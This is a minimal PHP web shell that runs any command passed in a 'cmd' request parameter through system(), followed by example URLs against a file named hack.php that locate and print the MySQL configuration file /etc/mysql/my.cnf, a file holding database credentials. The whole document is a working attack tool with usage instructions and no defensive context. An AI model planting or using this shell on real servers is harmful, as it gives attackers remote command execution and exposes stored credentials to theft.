<?php
  if(isset($_REQUEST['cmd'])) {
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
  } else {
    echo "What is your bidding?";
  }
?>


cdn.example.com/1a2fe/hack.php?cmd=command+goes+here
cdn.example.com/1a2fe/hack.php?cmd=locate+my.cnf
cdn.example.com/1a2fe/hack.php?cmd=cat+/etc/mysql/my.cnf

